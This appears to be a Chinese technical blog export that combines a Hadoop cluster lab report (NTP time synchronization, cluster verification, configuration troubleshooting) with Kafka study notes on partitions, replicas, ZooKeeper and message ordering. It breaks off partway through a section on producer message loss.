<p>如果服务器在内网环境，必须要配置集群时间同步，否则时间久了，会产生时间偏差， 导致集群执行任务时间不同步。</p>
<h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>找一个机器，作为时间服务器，所有的机器与这台集群时间进行定时的同步，生产环境 根据任务对时间的准确程度要求周期同步。测试环境为了尽快看到效果，采用 1 分钟同步一 次。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220053356.png" alt="截屏2021-06-28 下午1.07.20"></p>
<h4 id="时间服务器配置（必须root用户）"><a href="#时间服务器配置（必须root用户）" class="headerlink" title="时间服务器配置（必须root用户）"></a>时间服务器配置（必须root用户）</h4><p>1.查看所有节点 ntpd 服务状态和开机自启动状态</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ sudo systemctl status ntpd</span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl start ntpd</span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl is-enabled ntpd</span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl status ntpd</span><br></pre></td></tr></table></figure>

<p>2.修改hadoop102的ntp.conf配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ sudo vi /etc/ntp.conf </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Hosts on <span class="built_in">local</span> network are less restricted.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">restrict 192.168.1.0 mask 255.255.255.0 nomodify notrap</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">授权 10.211.55.0-10.211.55.255 网段上的所有机器可以从这台机器上查询和同步时间</span></span><br><span class="line">restrict 10.211.55.0 mask 255.255.255.0 nomodify notrap</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Use public servers from the pool.ntp.org project.</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Please consider joining the pool (http://www.pool.ntp.org/join.html).</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">集群在局域网中不使用其他互联网上的时间，下面4个都注释掉</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server 127.127.1.0 #127.127.1.0 不是IP 地址。 它是一种格式，用来引用向服务器提供准确时间的时钟。</span><br><span class="line">fudge 127.127.1.0 stratum 10</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 ~]$ sudo vi /etc/sysconfig/ntpd</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">增加内容如下（让硬件时间与系统时间一起同步）</span></span><br><span class="line">SYNC_HWCLOCK=yes</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动ntpd</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl start ntpd</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置开机自启</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl enable ntpd</span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/ntpd.service to /usr/lib/systemd/system/ntpd.service.</span><br></pre></td></tr></table></figure>

<p>3.其他机器配置（必须root用户）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop103 ~]$ sudo systemctl stop ntpd</span><br><span class="line">[huang@hadoop103 ~]$ sudo systemctl disable ntpd</span><br><span class="line"></span><br><span class="line">[huang@hadoop104 ~]$ sudo systemctl stop ntpd</span><br><span class="line">[huang@hadoop104 ~]$ sudo systemctl disable ntpd</span><br><span class="line"></span><br><span class="line">[huang@hadoop104 ~]$ sudo crontab -e</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编写内容如下</span></span><br><span class="line">*/1 * * * * /usr/sbin/ntpdate hadoop102</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[huang@hadoop103 ~]$ sudo crontab -e</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编写内容如下</span></span><br><span class="line">*/1 * * * * /usr/sbin/ntpdate hadoop102</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">任意修改机器时间</span></span><br><span class="line">[huang@hadoop103 ~]$ sudo date -s &quot;2021-9-9 11:11:11&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">一分钟后查看</span></span><br><span class="line">[huang@hadoop103 ~]$ sudo date</span><br></pre></td></tr></table></figure>

<h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><h3 id="使用jpsall查看各个节点的状态"><a href="#使用jpsall查看各个节点的状态" class="headerlink" title="使用jpsall查看各个节点的状态"></a>使用jpsall查看各个节点的状态</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220053357.png" alt="image-20210628134220753"></p>
<p>与集群规划结果一致</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220059915.png" alt="image-20210628012056622"></p>
<h3 id="集群时间同步正常"><a href="#集群时间同步正常" class="headerlink" title="集群时间同步正常"></a>集群时间同步正常</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102726.png" alt="image-20210628134736319"></p>
<h3 id="NameNode-HTTP-UI查看DataNode情况"><a href="#NameNode-HTTP-UI查看DataNode情况" class="headerlink" title="NameNode HTTP UI查看DataNode情况"></a>NameNode HTTP UI查看DataNode情况</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220100464.png" alt="1"></p>
<h3 id="MapReduce查看执行任务，Active-Nodes为3"><a href="#MapReduce查看执行任务，Active-Nodes为3" class="headerlink" title="MapReduce查看执行任务，Active Nodes为3"></a>MapReduce查看执行任务，Active Nodes为3</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220101234.png" alt="2"></p>
<h3 id="历史服务器查看执行过的任务"><a href="#历史服务器查看执行过的任务" class="headerlink" title="历史服务器查看执行过的任务"></a>历史服务器查看执行过的任务</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220101747.png" alt="3"></p>
<h2 id="四、实验遇到的问题及解决方法"><a href="#四、实验遇到的问题及解决方法" class="headerlink" title="四、实验遇到的问题及解决方法"></a>四、实验遇到的问题及解决方法</h2><p>此部分为实验报告关键部分，详尽叙述实验过程中遇到的问题和解决方法</p>
<h3 id="Error-Could-not-find-or-load-main-class-org-apache-hadoop-mapreduce-v2-app-MRAppMaster"><a href="#Error-Could-not-find-or-load-main-class-org-apache-hadoop-mapreduce-v2-app-MRAppMaster" class="headerlink" title="Error: Could not find or load main class org.apache.hadoop.mapreduce.v2.app.MRAppMaster"></a>Error: Could not find or load main class org.apache.hadoop.mapreduce.v2.app.MRAppMaster</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102727.png" alt="image-20210628140143997"></p>
<p>解决方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ vi /opt/module/hadoop-3.1.3/etc/hadoop/mapred-site.xml </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在文件中增加以下内容</span></span><br><span class="line">&lt;/property&gt;</span><br><span class="line">        &lt;property&gt;</span><br><span class="line">                &lt;name&gt;yarn.app.mapreduce.am.env&lt;/name&gt;</span><br><span class="line">                &lt;value&gt;HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3&lt;/value&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">        &lt;property&gt;</span><br><span class="line">                &lt;name&gt;mapreduce.map.env&lt;/name&gt;</span><br><span class="line">                &lt;value&gt;HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3&lt;/value&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">        &lt;property&gt;</span><br><span class="line">                &lt;name&gt;mapreduce.reduce.env&lt;/name&gt;</span><br><span class="line">                &lt;value&gt;HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br></pre></td></tr></table></figure>

<h3 id="NameNode-Web服务器无法访问"><a href="#NameNode-Web服务器无法访问" class="headerlink" title="NameNode Web服务器无法访问"></a>NameNode Web服务器无法访问</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102835.png" alt="4">解决方案：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭防火墙</span></span><br><span class="line">[huang@hadoop102 ~]$ systemctl stop firewalld</span><br><span class="line">[huang@hadoop102 ~]$ systemctl disable firewalld.service</span><br><span class="line"></span><br><span class="line">[huang@hadoop103 ~]$ systemctl stop firewalld</span><br><span class="line">[huang@hadoop103 ~]$ systemctl disable firewalld.service</span><br><span class="line"></span><br><span class="line">[huang@hadoop104 ~]$ systemctl stop firewalld</span><br><span class="line">[huang@hadoop104 ~]$ systemctl disable firewalld.service</span><br></pre></td></tr></table></figure>



<h3 id="Hadoop104-上DateNode和NodeManager没启动"><a href="#Hadoop104-上DateNode和NodeManager没启动" class="headerlink" title="Hadoop104 上DateNode和NodeManager没启动"></a>Hadoop104 上DateNode和NodeManager没启动</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102728.png" alt="image-20210628141052256"></p>
<p>解决方案：</p>
<p>workers配置错误，重新配置workers</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">该文件中不允许出现空格，结尾也不行</span></span><br><span class="line">[huang@hadoop102 ~]$ vi /opt/module/hadoop-3.1.3/etc/hadoop/workers </span><br><span class="line">hadoop102</span><br><span class="line">hadoop103</span><br><span class="line">hadoop104</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 ~]$ xsync /opt/module/hadoop-3.1.3/etc/ </span><br></pre></td></tr></table></figure>



<h3 id="修改配置后重启服务发现DataNode和NameNode进程只能重启一个"><a href="#修改配置后重启服务发现DataNode和NameNode进程只能重启一个" class="headerlink" title="修改配置后重启服务发现DataNode和NameNode进程只能重启一个"></a>修改配置后重启服务发现DataNode和NameNode进程只能重启一个</h3><p>因为NameNode在format初始化后会生成clusterId（集群ID），DateNode在启动后会生成和NameNode一样的clusterId（集群ID），再次格式化NameNode，生成新的clusterid，与未删除DataNode的clusterid不一致，集群找不到已往数据。</p>
<p>解决方法：</p>
<p>需要重新格式化 NameNode 的话，<strong>一定要先停止所有机器的NameNode 和 DataNode 进程，并且要删除所有机器的 data 和 logs 目录，然后再进行格式化</strong>。</p>
<h3 id="ssh没有配置好，导致使用myhadoop-sh时需要输入密码"><a href="#ssh没有配置好，导致使用myhadoop-sh时需要输入密码" class="headerlink" title="ssh没有配置好，导致使用myhadoop.sh时需要输入密码"></a>ssh没有配置好，导致使用myhadoop.sh时需要输入密码</h3><p>解决方法：用ssh将各个服务器都互相连接一边，如果出现连不上，需要重新配置</p>
<h3 id="ERROR-conf-Configuration-error-parsing-conf-yarn-site-yml"><a href="#ERROR-conf-Configuration-error-parsing-conf-yarn-site-yml" class="headerlink" title="ERROR conf.Configuration: error parsing conf yarn-site.yml"></a>ERROR conf.Configuration: error parsing conf yarn-site.yml</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102729.png" alt="image-20210628142738471"></p>
<p>解决方法：</p>
<p>yarn-site.yml 中的一个配置项多输了一个空格，删掉即可</p>
<h3 id="通过ssh连接到其他服务器时，自己配置的环境变量会失效，每次都得source-x2F-etc-x2F-profile"><a href="#通过ssh连接到其他服务器时，自己配置的环境变量会失效，每次都得source-x2F-etc-x2F-profile" class="headerlink" title="通过ssh连接到其他服务器时，自己配置的环境变量会失效，每次都得source &#x2F;etc&#x2F;profile"></a>通过ssh连接到其他服务器时，自己配置的环境变量会失效，每次都得source &#x2F;etc&#x2F;profile</h3><p>ssh连接时环境变量无效：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102730.png" alt="image-20210628195903368"></p>
<p>在hadoop内时环境变量有效：</p>
<p>![截屏2021-06-28 下午8.06.44 (SA20225201-黄名旺-Lab-1.assets&#x2F;截屏2021-06-28 下午8.06.44 (2)-4882079.png)</p>
<p>配置的环境变量的方式：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置JDK环境变量</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo vi /etc/profile.d/my_env.sh</span><br><span class="line">export JAVA_HOME=/opt/module/jdk1.8.0_212</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br></pre></td></tr></table></figure>

<p>问题原因：</p>
<p>SSH 登录默认为非shell登录方式，而非shell登录方式执行的是bashrc脚本初始化环境变量。<br>而shell登录方式则是执行的是profile脚本初始化环境变量。</p>
<p>解决方法：</p>
<p>把在&#x2F;etc&#x2F;profile.d&#x2F;my_env.sh中配置的内容放进 &#x2F;etc&#x2F;bashrc 文件中即可；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ sudo vi /etc/bashrc</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">JAVA_HOME</span></span><br><span class="line">export JAVA_HOME=/opt/module/jdk1.8.0_212</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">HADOOP_HOME</span></span><br><span class="line">export HADOOP_HOME=/opt/module/hadoop-3.1.3 export PATH=$PATH:$HADOOP_HOME/bin</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/sbin</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 ~]$ sudo xsync /etc/bashrc</span><br><span class="line">==================== hadoop102 ====================</span><br><span class="line">sending incremental file list</span><br><span class="line"></span><br><span class="line">sent 45 bytes  received 12 bytes  38.00 bytes/sec</span><br><span class="line">total size is 3,058  speedup is 53.65</span><br><span class="line">==================== hadoop103 ====================</span><br><span class="line">sending incremental file list</span><br><span class="line">bashrc</span><br><span class="line"></span><br><span class="line">sent 366 bytes  received 65 bytes  862.00 bytes/sec</span><br><span class="line">total size is 3,058  speedup is 7.10</span><br><span class="line">==================== hadoop104 ====================</span><br><span class="line">sending incremental file list</span><br><span class="line">bashrc</span><br><span class="line"></span><br><span class="line">sent 366 bytes  received 65 bytes  862.00 bytes/sec</span><br><span class="line">total size is 3,058  speedup is 7.10</span><br></pre></td></tr></table></figure>

<p>问题解决：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102731.png" alt="image-20210628201757923"></p>
]]></content>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>Kafka</title>
    <url>/2021/12/21/Kafka/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h1><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203012100807.png" alt="image-20211018200516549"></p>
<ul>
<li><p>消费者组提升消费能力，如果消费者组内的消费者数大于partition数就没有意义了，并发度最好的时候是消费者和分区数一样的时候。</p>
</li>
<li><p>消费者已拉取的方式通信。</p>
</li>
<li><p>follower只能在leader挂了的时候才有用，其他时候只是一个备份</p>
</li>
<li><p>Kafka的消息存在磁盘，一般存7天</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">case $1 in</span><br><span class="line">&quot;start&quot;)&#123;</span><br><span class="line">        for i in hadoop102 hadoop103 hadoop104</span><br><span class="line">        do</span><br><span class="line">        echo &quot;===========$i start kafka===========&quot;</span><br><span class="line">        ssh $i &#x27;/opt/module/kafka/bin/kafka-server-start.sh -daemon /opt/module/kafka/config/server.properties&#x27;</span><br><span class="line">        done</span><br><span class="line">&#125;;;</span><br><span class="line"></span><br><span class="line">&quot;stop&quot;)&#123;</span><br><span class="line">        for i in hadoop102 hadoop103 hadoop104</span><br><span class="line">        do</span><br><span class="line">        echo &quot;===========$i stop kafka===========&quot;</span><br><span class="line">        ssh $i &#x27;/opt/module/kafka/bin/kafka-server-stop.sh /opt/module/kafka/config/server.properties&#x27;</span><br><span class="line">        done</span><br><span class="line">&#125;;;</span><br><span class="line"></span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<h2 id="为什么高版本不用zk？"><a href="#为什么高版本不用zk？" class="headerlink" title="为什么高版本不用zk？"></a>为什么高版本不用zk？</h2><p>一边拉消息，一边还要与zk连接，效率不高。</p>
<h2 id="为什么要设计分区？"><a href="#为什么要设计分区？" class="headerlink" title="为什么要设计分区？"></a>为什么要设计分区？</h2><p>首先Topic中有分区的概念，每个分区保存各自的数据，而Group对应着Topic，也就是这个Topic中的数据都是由该Group去消费，也就是允许多个消费者同时消费，这样能大大提高Kafka的吞吐量。不过这样的设计也会带来不少的不便，比如特定场景下你需要去维护多个Partition之间的关系。</p>
<h2 id="Kafka-是什么？主要应用场景有哪些？"><a href="#Kafka-是什么？主要应用场景有哪些？" class="headerlink" title="Kafka 是什么？主要应用场景有哪些？"></a>Kafka 是什么？主要应用场景有哪些？</h2><p>Kafka 是一个分布式流式处理平台。</p>
<p>流平台具有三个关键功能：</p>
<ol>
<li><strong>消息队列</strong>：发布和订阅消息流，这个功能类似于消息队列，这也是 Kafka 也被归类为消息队列的原因。</li>
<li><strong>容错的持久方式存储记录消息流</strong>： Kafka 会把消息持久化到磁盘，有效避免了消息丢失的风险。</li>
<li><strong>流式处理平台：</strong> 在消息发布的时候进行处理，Kafka 提供了一个完整的流式处理类库。</li>
</ol>
<p>Kafka 主要有两大应用场景：</p>
<ol>
<li><strong>消息队列</strong> ：建立实时流数据管道，以可靠地在系统或应用程序之间获取数据。</li>
<li><strong>数据处理：</strong> 构建实时的流数据处理程序来转换或处理数据流。</li>
</ol>
<h2 id="和其他消息队列相比，Kafka的优势在哪里？"><a href="#和其他消息队列相比，Kafka的优势在哪里？" class="headerlink" title="和其他消息队列相比，Kafka的优势在哪里？"></a>和其他消息队列相比，Kafka的优势在哪里？</h2><p> Kafka 相比其他消息队列主要的优势如下：</p>
<ol>
<li><strong>极致的性能</strong> ：基于 Scala 和 Java 语言开发，设计中大量使用了批量处理和异步的思想，最高可以每秒处理千万级别的消息。</li>
<li><strong>生态系统兼容性无可匹敌</strong> ：Kafka 与周边生态系统的兼容性是最好的没有之一，尤其在大数据和流计算领域。</li>
</ol>
<p>实际上在早期的时候 Kafka 并不是一个合格的消息队列，早期的 Kafka 在消息队列领域就像是一个衣衫褴褛的孩子一样，功能不完备并且有一些小问题比如丢失消息、不保证消息可靠性等等。当然，这也和 LinkedIn 最早开发 Kafka 用于处理海量的日志有很大关系，人家本来最开始就不是为了作为消息队列滴，谁知道后面误打误撞在消息队列领域占据了一席之地。</p>
<p>随着后续的发展，这些短板都被 Kafka 逐步修复完善。所以，Kafka 作为消息队列不可靠这个说法已经过时。</p>
<h2 id="队列模型了解吗？Kafka-的消息模型知道吗？"><a href="#队列模型了解吗？Kafka-的消息模型知道吗？" class="headerlink" title="队列模型了解吗？Kafka 的消息模型知道吗？"></a>队列模型了解吗？Kafka 的消息模型知道吗？</h2><h3 id="队列模型：早期的消息模型"><a href="#队列模型：早期的消息模型" class="headerlink" title="队列模型：早期的消息模型"></a>队列模型：早期的消息模型</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203012058276.png" alt="队列模型"></p>
<p><strong>使用队列（Queue）作为消息通信载体，满足生产者与消费者模式，一条消息只能被一个消费者使用，未被消费的消息在队列中保留直到被消费或超时。</strong> 比如：生产者发送 100 条消息的话，两个消费者来消费一般情况下两个消费者会按照消息发送的顺序各自消费一半（也就是你一个我一个的消费。）</p>
<p><strong>队列模型存在的问题：</strong></p>
<p>假如存在这样一种情况：需要将生产者产生的消息分发给多个消费者，并且每个消费者都能接收到完整的消息内容。</p>
<p>这种情况，队列模型就不好解决了。很多比较杠精的人就说：我们可以为每个消费者创建一个单独的队列，让生产者发送多份。这是一种非常愚蠢的做法，浪费资源不说，还违背了使用消息队列的目的。</p>
<h3 id="发布-订阅模型：Kafka-消息模型"><a href="#发布-订阅模型：Kafka-消息模型" class="headerlink" title="发布-订阅模型：Kafka 消息模型"></a>发布-订阅模型：Kafka 消息模型</h3><p>发布-订阅模型主要是为了解决队列模型存在的问题。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203012058324.png" alt="发布订阅模型"></p>
<p>发布订阅模型（Pub-Sub） 使用<strong>主题（Topic）</strong> 作为消息通信载体，类似于<strong>广播模式</strong>；发布者发布一条消息，该消息通过主题传递给所有的订阅者，<strong>在一条消息广播之后才订阅的用户则是收不到该条消息的</strong>。</p>
<p><strong>在发布 - 订阅模型中，如果只有一个订阅者，那它和队列模型就基本是一样的了。所以说，发布 - 订阅模型在功能层面上是可以兼容队列模型的。</strong></p>
<p><strong>Kafka 采用的就是发布 - 订阅模型。</strong></p>
<blockquote>
<p><strong>RocketMQ 的消息模型和 Kafka 基本是完全一样的。唯一的区别是 Kafka 中没有队列这个概念，与之对应的是 Partition（分区）。</strong></p>
</blockquote>
<h2 id="什么是Producer、Consumer、Broker、Topic、Partition？"><a href="#什么是Producer、Consumer、Broker、Topic、Partition？" class="headerlink" title="什么是Producer、Consumer、Broker、Topic、Partition？"></a>什么是Producer、Consumer、Broker、Topic、Partition？</h2><p>Kafka 将生产者发布的消息发送到主题（Topic）中，需要这些消息的消费者可以订阅这些主题（Topic），如下图所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203012058422.png" alt="Kafka Topic Partition"></p>
<p>上面这张图也为我们引出了，Kafka 比较重要的几个概念：</p>
<ul>
<li><p><strong>生产者（Producer）</strong> ：产生消息的一方。</p>
</li>
<li><p><strong>消费者（Consumer）</strong> ：消费消息的一方。</p>
</li>
<li><p><strong>代理（Broker）</strong> ：可以看作是一个独立的 Kafka 实例。多个 Kafka Broker 组成一个 Kafka Cluster。同时，每个 Broker 中又包含了 Topic 以及 Partition 这两个重要的概念：</p>
</li>
</ul>
<ul>
<li><strong>主题（Topic）</strong> ：Producer 将消息发送到特定的主题，Consumer 通过订阅特定的主题（Topic） 来消费消息。</li>
<li><strong>分区（Partition）</strong> ：Partition 属于 Topic 的一部分。一个 Topic 可以有多个 Partition ，并且同一 Topic 下的 Partition 可以分布在不同的 Broker 上，这也就表明一个 Topic 可以横跨多个 Broker 。</li>
</ul>
<blockquote>
<p>重点：Kafka 中的 Partition（分区） 实际上可以对应成消息队列中的队列。</p>
</blockquote>
<h2 id="Kafka-的多副本机制了解吗？带来了什么好处？"><a href="#Kafka-的多副本机制了解吗？带来了什么好处？" class="headerlink" title="Kafka 的多副本机制了解吗？带来了什么好处？"></a>Kafka 的多副本机制了解吗？带来了什么好处？</h2><p>分区（Partition）中的多个副本之间会有一个叫做 leader 的家伙，其他副本称为 follower。发送的消息会被发送到 leader 副本，然后 follower 副本才能从 leader 副本中拉取消息进行同步。</p>
<blockquote>
<p>生产者和消费者只与 leader 副本交互。可以理解为其他副本只是 leader 副本的拷贝，它们的存在只是为了保证消息存储的安全性。当 leader 副本发生故障时会从 follower 中选举出一个 leader，但是 follower 中如果有和 leader 同步程度达不到要求的参加不了 leader 的竞选。</p>
</blockquote>
<p><strong>Kafka 的多分区（Partition）以及多副本（Replica）机制有什么好处呢？</strong></p>
<ol>
<li>Kafka 通过给特定 Topic 指定多个 Partition, 而各个 Partition 可以分布在不同的 Broker 上, 这样便能提供比较好的并发能力（负载均衡）。</li>
<li>Partition 可以指定对应的 Replica 数, 这也极大地提高了消息存储的安全性, 提高了容灾能力，不过也相应的增加了所需要的存储空间。</li>
</ol>
<h2 id="Zookeeper-在-Kafka-中的作用知道吗？"><a href="#Zookeeper-在-Kafka-中的作用知道吗？" class="headerlink" title="Zookeeper 在 Kafka 中的作用知道吗？"></a>Zookeeper 在 Kafka 中的作用知道吗？</h2><blockquote>
<p><strong>要想搞懂 zookeeper 在 Kafka 中的作用 一定要自己搭建一个 Kafka 环境然后自己进 zookeeper 去看一下有哪些文件夹和 Kafka 有关，每个节点又保存了什么信息。</strong></p>
</blockquote>
<p>下图就是我的本地 Zookeeper ，它成功和我本地的 Kafka 关联上（以下文件夹结构借助 idea 插件 Zookeeper tool 实现）。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203012058477.jpg" alt="img"></p>
<p>ZooKeeper 主要为 Kafka 提供元数据的管理的功能。</p>
<p>从图中我们可以看出，Zookeeper 主要为 Kafka 做了下面这些事情：</p>
<ol>
<li><strong>Broker 注册</strong> ：在 Zookeeper 上会有一个专门<strong>用来进行 Broker 服务器列表记录</strong>的节点。每个 Broker 在启动时，都会到 Zookeeper 上进行注册，即到 <code>/brokers/ids</code> 下创建属于自己的节点。每个 Broker 就会将自己的 IP 地址和端口等信息记录到该节点中去</li>
<li><strong>Topic 注册</strong> ： 在 Kafka 中，同一个<strong>Topic 的消息会被分成多个分区</strong>并将其分布在多个 Broker 上，<strong>这些分区信息及与 Broker 的对应关系</strong>也都是由 Zookeeper 在维护。比如我创建了一个名字为 my-topic 的主题并且它有两个分区，对应到 zookeeper 中会创建这些文件夹：<code>/brokers/topics/my-topic/Partitions/0</code>、<code>/brokers/topics/my-topic/Partitions/1</code></li>
<li><strong>负载均衡</strong> ：Kafka 通过给特定 Topic 指定多个 Partition，而各个 Partition 可以分布在不同的 Broker 上，这样便能提供比较好的并发能力。 对于同一个 Topic 的不同 Partition，Kafka 会尽力将这些 Partition 分布到不同的 Broker 服务器上。当生产者产生消息后也会尽量投递到不同 Broker 的 Partition 里面。当 Consumer 消费的时候，Zookeeper 可以根据当前的 Partition 数量以及 Consumer 数量来实现动态负载均衡。</li>
<li>……</li>
</ol>
<h2 id="Kafka-如何保证消息的消费顺序？"><a href="#Kafka-如何保证消息的消费顺序？" class="headerlink" title="Kafka 如何保证消息的消费顺序？"></a>Kafka 如何保证消息的消费顺序？</h2><p>在使用消息队列的过程中经常有业务场景需要严格保证消息的消费顺序，比如同时发了 2 个消息，这 2 个消息对应的操作分别对应的数据库操作是：</p>
<ol>
<li>更改用户会员等级。</li>
<li>根据会员等级计算订单价格。</li>
</ol>
<p>假如这两条消息的消费顺序不一样造成的最终结果就会截然不同。</p>
<p>Kafka 中分区（Partition）是真正保存消息的地方，发送的消息都被放在了这里。而分区（Partition）又存在于 主题（Topic） 这个概念中，并且可以给特定 Topic 指定多个 Partition。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203012058526.png" alt="img"></p>
<p>每次添加消息到分区（Partition）的时候都会采用尾加法，如上图所示。 <strong>Kafka 只能保证分区（Partition）中的消息有序。</strong></p>
<blockquote>
<p>消息在被追加到分区（Partition）的时候都会分配一个特定的偏移量（offset）。Kafka 通过偏移量（offset）来保证消息在分区内的顺序性。</p>
</blockquote>
<ul>
<li><p><strong>1 个 Topic 只对应一个 Partition</strong>。这样当然可以解决问题，但是破坏了 Kafka 的设计初衷。</p>
</li>
<li><p>Kafka 中发送 1 条消息的时候，可以指定 topic, partition, key,data（数据） 4 个参数。如果你发送消息的时候指定了 Partition 的话，所有消息都会被发送到指定的 Partition。并且，同一个 key 的消息可以保证只发送到同一个 partition，这个我们采用表&#x2F;对象的 id 来作为 key 。</p>
</li>
</ul>
<p>总结一下，对于如何保证 Kafka 中消息消费的顺序，有了下面两种方法：</p>
<ol>
<li>1 个 Topic 只对应一个 Partition。</li>
<li>（推荐）发送消息的时候指定 key&#x2F;Partition。</li>
</ol>
<h2 id="Kafka-如何保证消息不丢失"><a href="#Kafka-如何保证消息不丢失" class="headerlink" title="Kafka 如何保证消息不丢失"></a>Kafka 如何保证消息不丢失</h2><h3 id="生产者丢失消息的情况"><a href="#生产者丢失消息的情况" class="headerlink" title="生产者丢失消息的情况"></a>生产者丢失消息的情况</h3><p>生产者（Producer）调用<code>send</code>方法发送消息之后，消息可能因为网络问题并没有发送过去。</p>
<p>所以，不能默认在调用<code>send</code>方法发送消息之后消息发送成功了。为了确定消息是发送成功，要判断消息发送的结果。但是要注意的是  Kafka 生产者（Producer）使用  <code>send</code> 方法发送消息实际上是异步的操作，可以通过 <code>get()</code>方法获取调用结果，但是这样也让它变为了同步操作，示例代码如下：</p>
<blockquote>
<p><strong>详细代码见我的这篇文章：<a href="https://mp.weixin.qq.com/s?__biz=Mzg2OTA0Njk0OA==&mid=2247486269&idx=2&sn=ec00417ad641dd8c3d145d74cafa09ce&chksm=cea244f6f9d5cde0c8eb233fcc4cf82e11acd06446719a7af55230649863a3ddd95f78d111de&token=1633957262&lang=zh_CN#rd">Kafka系列第三篇！10 分钟学会如何在 Spring Boot 程序中使用 Kafka 作为消息队列?  (opens new window)</a></strong></p>
</blockquote>
